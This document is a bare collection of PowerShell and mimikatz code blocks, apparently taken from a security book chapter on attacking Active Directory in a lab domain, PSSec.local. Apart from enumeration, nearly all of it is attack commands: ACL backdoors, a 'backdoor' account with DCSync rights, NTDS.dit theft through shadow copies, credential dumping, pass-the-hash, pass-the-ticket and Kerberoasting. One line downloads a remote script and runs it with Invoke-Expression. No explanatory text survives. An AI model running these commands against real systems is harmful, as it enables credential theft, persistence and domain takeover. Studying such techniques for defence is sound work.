["```\n$searcher = New-Object System.DirectoryServices.DirectorySearcher\n$searcher.Filter = \"(&(sAMAccountType=805306368)(givenName=Miriam))\"\n$searcher.FindAll() | ForEach-Object {\n    Write-Output \"Name: $($_.Properties['cn'])\"\n    Write-Output \"Username: $($_.Properties['sAMAccountName'])\"\n    Write-Output \"Email: $($_.Properties['mail'])\"\n    Write-Output \"\"\n}\n```", "```\n$DistinguishedName = \"LDAP://OU=PSSec Computers,DC=PSSec,DC=local\"\n([System.DirectoryServices.DirectoryEntry]$DistinguishedName).Children\n```", "```\n$DistinguishedName = \"LDAP://OU=PSSec Computers,DC=PSSec,DC=local\"\n([adsi]$DistinguishedName).Children\n```", "```\n([adsisearcher]\"(&(sAMAccountType=805306368)(givenName=Miriam))\").FindAll() | ForEach-Object {\n    Write-Output \"Name: $($_.Properties['cn'])\"\n    Write-Output \"Username: $($_.Properties['sAMAccountName'])\"\n    Write-Output \"Email: $($_.Properties['mail'])\"\n    Write-Output \"\"\n}\n```", "```\n> Get-ADUser -Filter *\n```", "```\n$domain = Get-WmiObject -Namespace root\\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty domain\n$filter = \"(sAMAccountType=805306368)\"\n$searcher = [adsisearcher]\"(&(objectCategory=User)$filter)\"\n$searcher.SearchRoot = \"LDAP://$domain\"\n$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}\n```", "```\n$DistinguishedName = \"LDAP://OU=PSSecComputers,DC=PSSec,DC=local\"\n$obj = [adsi]$DistinguishedName\n$obj.gplink\n```", "```\n$GpoFilter = \"(objectCategory=groupPolicyContainer)\"\n$Searcher = [adsisearcher]$GpoFilter\n$Searcher.SearchRoot = [adsi]\"LDAP://DC=PSSec,DC=local\"\n$Searcher.FindAll() | ForEach-Object {\n    Write-Host \"GPO Name:\" $_.Properties.displayname\n    Write-Host \"GPO Path:\" $_.Properties.adspath\n}\n```", "```\n$GpoList = Get-GPO -All -domain \"PSSec.local\"\n$GpoList | ForEach-Object {\n    Write-Host \"GPO Name:\" $_.DisplayName\n    Write-Host \"GPO Path:\" $_.Path\n}\n```", "```\n> .\\Get-UsersAndGroups.ps1 | Export-Csv -Path C:\\tmp\\ADGroups.csv\n```", "```\n> ([adsisearcher]\"(&(objectClass=group)(cn=*))\").FindAll()\n```", "```\n$TargetOU = \"OU=Accounts,OU=Tier 0,DC=PSSec,DC=local\"\n$AttackerIdentity=[System.Security.Principal.NTAccount]'PSSec\\vvega'\n$Ou = [ADSI]\"LDAP://$TargetOU\"\n$Sec = $Ou.psbase.ObjectSecurity\n$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, \"ReadProperty, WriteProperty\", \"Allow\")\n$Sec.AddAccessRule($Ace)\n$Ou.psbase.CommitChanges()\n```", "```\n> Get-ADOrganizationalUnit -Filter * | Out-GridView\n```", "```\n> ([adsisearcher]\"objectCategory=organizationalUnit\").FindAll()\n```", "```\n> Get-Acl -Path \"AD:\\$(<DistinguishedName>)\").Access\n```", "```\n> .\\Get-OuACLSecurity.ps1 | Export-Csv -Path C:\\tmp\\OuAcls.csv\n```", "```\n$Searcher = [adsisearcher]\"(&(objectClass=groupPolicyContainer)(displayName=Default domain Policy))\"\n$Searcher.SearchRoot = [adsi]\"LDAP://CN=Policies,CN=System,DC=PSSec,DC=local\"\n$Searcher.PropertiesToLoad.Add(\"distinguishedName\") | Out-Null\n$SearchResult = $Searcher.FindOne()\n$DistinguishedName = $SearchResult.Properties[\"distinguishedName\"][0]\n$TargetGPO = $DistinguishedName\n$AttackerIdentity=[System.Security.Principal.NTAccount]'PSSec\\vvega'\n$Gpo = [ADSI]\"LDAP://$TargetGPO\"\n$Sec = $Gpo.psbase.ObjectSecurity\n$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, \"GenericAll\", \"Allow\")\n$Sec.AddAccessRule($Ace)\n$Gpo.psbase.CommitChanges()\n```", "```\n$AttackerName = \"backdoor\"\n$AttackerPassword = Read-Host -AsSecureString\n$AttackerDescription = \"Backdoor account for DCSync attack\"\n$AttackerPath = \"OU=Service Accounts,OU=Tier 0,DC=PSSec,DC=local\"\nNew-ADUser -Name $AttackerName -AccountPassword $AttackerPassword -Description $AttackerDescription -Path $AttackerPath -Enabled $true\n```", "```\n$AttackerIdentity = [System.Security.Principal.NTAccount](\"PSSec\\\" + (Get-ADUser $AttackerName).Name).ToString()\n$Dsa = [ADSI]\"LDAP://rootDSE\"\n$domainDN = $Dsa.defaultNamingContext\n$ReplAllGUID = \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n$ObjRights = \"ExtendedRight\"\n$ObjControlType  = [System.Security.AccessControl.AccessControlType]::Allow\n$ObjInherit = [System.DirectoryServices.ActiveDirectorySecurityInheritance]\"All\"\n```", "```\n$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, $ObjRights, $ObjControlType , $ObjInherit, $ReplAllGUID)\n$Dacl = [ADSI]\"LDAP://$domainDN\"\n$Dacl.psbase.ObjectSecurity.AddAccessRule($Ace)\n$Dacl.psbase.CommitChanges()\n```", "```\n> .\\mimikatz.exe\n```", "```\n> lsadump::dcsync /all /csv\n```", "```\n> Get-ADTrust -Filter *\n```", "```\n> ([adsisearcher]\"(objectClass=trusteddomain)\").FindAll()\n```", "```\n$ShadowCopy = Invoke-CimMethod -ClassName \"Win32_ShadowCopy\" -Namespace \"root\\cimv2\" -MethodName \"Create\" -Arguments @{Volume=\"C:\\\"}\n$ShadowCopyPath = (Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $ShadowCopy.ShadowID }).DeviceObject + \"\\\\\"\ncmd /c mklink /d C:\\shadowcopy \"$ShadowCopyPath\"\n```", "```\nCopy-Item \"C:\\shadowcopy\\Windows\\NTDS\\ntds.dit\" -Destination \"C:\\tmp\"\n```", "```\n(Get-Item C:\\shadowcopy).Delete()\n```", "```\n> Invoke-Mimikatz -DumpCreds\n```", "```\n> Invoke-Mimikatz -DumpCreds -ComputerName \"PSSec-PC01\"\n> Invoke-Mimikatz -DumpCreds -ComputerName @(PSSec-PC01, PSSec-PC02)\n```", "```\n> Invoke-Mimikatz -Command \"privilege::debug exit\" -ComputerName \"PSSec-PC01\"\n```", "```\n> .\\mimikatz.exe\n```", "```\n> log\n> privilege::debug\n> sekurlsa::logonpasswords\n```", "```\n> Sekurlsa::pth /user:administrator /domain:PSSec /ntlm:7dfa0531d73101ca080c7379a9bff1c7\n```", "```\nkerberos::list /export\n```", "```\n> kerberos::ptt [0;2856bf]-2-0-40e10000-administrator@krbtgt-PSSEC.LOCAL.kirbi\n> misc::cmd\n```", "```\n> Invoke-Expression (Invoke-WebRequest -UseBasicParsing \"https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1\")\n```", "```\n> Add-Type -AssemblyName System.IdentityModel\n> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList IIS-User/server.PSSec.local:80\n```", "```\n> Import-Module .\\Invoke-Kerberoast.ps1\n> Invoke-Kerberoast -Format Hashcat | Select-Object Hash | ConvertTo-Csv -NoTypeInformation | Out-File kerberoast-hashes.csv\n```"]